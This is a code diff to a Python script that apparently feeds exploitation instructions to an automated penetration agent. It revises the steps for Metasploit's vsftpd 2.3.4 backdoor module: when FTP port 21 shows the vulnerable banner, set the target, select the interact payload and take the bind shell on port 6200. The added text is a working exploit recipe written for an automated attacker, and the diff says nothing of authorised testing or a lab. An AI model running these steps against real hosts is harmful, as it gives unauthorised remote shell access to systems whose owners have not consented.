@@ -48,15 +48,22 @@ def main():
         instructions="""
         TRIGGER: If Port 21 is OPEN and service banner contains "vsftpd 2.3.4".
         RECOMMENDED MODULE: exploit/unix/ftp/vsftpd_234_backdoor
-        
+
         CONFIGURATION STEPS:
         1. use exploit/unix/ftp/vsftpd_234_backdoor
         2. set RHOSTS <TARGET_IP>
         3. set RPORT 21
-        4. set UNKNOWN_CONNECTION_ERROR true (optional, helps connectivity)
-        5. exploit
-        
-        NOTE: This module opens a shell instantly. No complex payload needed.
+        4. set TARGET 1                   # 1 = "Backdoor Command Shell" (MANDATORY)
+        5. set PAYLOAD cmd/unix/interact  # the ONLY payload valid for TARGET 1
+        6. exploit
+
+        REQUIRED OPTIONS (put these EXACT keys/values in the JSON "options"):
+            "TARGET": "1", "PAYLOAD": "cmd/unix/interact"
+        WHY THIS IS CRITICAL: this module has two targets. TARGET 0
+        ("Linux/Unix Command") does NOT accept cmd/unix/interact and fails with
+        "Invalid payload for given target". TARGET 1 connects to the backdoor
+        shell the server binds on port 6200 and returns a session instantly.
+        Do NOT set LHOST/LPORT here (this is a bind backdoor, not a reverse shell).
         """
     ))
 
